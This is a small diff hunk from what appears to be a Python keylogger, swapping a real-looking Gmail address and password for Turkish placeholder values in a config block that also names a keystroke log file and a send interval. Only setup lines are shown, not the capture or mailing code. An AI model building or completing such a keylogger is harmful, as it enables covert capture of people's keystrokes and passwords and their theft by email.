@@ -8,8 +8,8 @@ from email.mime.text import MIMEText
 word = ""
 interval = 10
 logfile = "keylog.txt"
-email_address = "s62650613@gmail.com"
-email_password = "....."
+email_address = "mail_girin"
+email_password = "mailin_şifresini_girin"
 
 
 def on_press(key):
